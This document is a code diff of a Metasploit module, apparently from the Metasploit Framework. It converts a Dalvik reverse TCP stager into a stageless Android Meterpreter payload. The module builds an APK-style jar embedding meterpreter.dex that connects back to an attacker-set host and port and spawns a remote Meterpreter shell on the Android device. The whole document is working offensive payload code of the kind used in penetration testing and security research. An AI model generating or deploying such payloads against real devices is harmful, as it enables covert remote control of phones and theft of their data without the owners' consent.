@@ -2,34 +2,37 @@
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'metasploit-payloads'
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
+require 'msf/core/payload/dalvik'
 require 'msf/core/payload/transport_config'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
+require 'msf/base/sessions/meterpreter_android'
+require 'msf/base/sessions/meterpreter_options'
+require 'rex/payloads/meterpreter/config'
 
 module MetasploitModule
 
   CachedSize = :dynamic
 
-  include Msf::Payload::Stager
   include Msf::Payload::TransportConfig
+  include Msf::Payload::Single
   include Msf::Payload::Dalvik
-  include Msf::Payload::UUID::Options
+  include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Dalvik Reverse TCP Stager',
-      'Description' => 'Connect back stager',
-      'Author'      => ['timwr', 'OJ Reeves'],
-      'License'     => MSF_LICENSE,
+      'Name'        => 'Android Meterpreter Shell, Reverse TCP Inline',
+      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
       'Platform'    => 'android',
       'Arch'        => ARCH_DALVIK,
+      'License'     => MSF_LICENSE,
       'Handler'     => Msf::Handler::ReverseTcp,
-      'Stager'      => {'Payload' => ''}
+      'Session'     => Msf::Sessions::Meterpreter_Java_Android,
+      'Payload'     => '',
     ))
+    
+    register_options([
+      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
+    ], self.class)
   end
 
   #
@@ -41,17 +44,16 @@ module MetasploitModule
 
   def generate_jar(opts={})
     jar = Rex::Zip::Jar.new
-
-    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
-    apply_options(classes, opts, payload_uri)
+    classes = MetasploitPayloads.read('android', 'meterpreter.dex')
+    url = "tcp://#{datastore['LHOST']}:#{datastore['LPORT']}"
+    opts[:stageless] = true
+    apply_options(classes, opts, url)
 
     jar.add_file("classes.dex", fix_dex_header(classes))
-
     files = [
       [ "AndroidManifest.xml" ],
       [ "resources.arsc" ]
     ]
-
     jar.add_files(files, MetasploitPayloads.path("android", "apk"))
     jar.build_manifest
 
@@ -60,5 +62,6 @@ module MetasploitModule
 
     jar
   end
+
 
 end
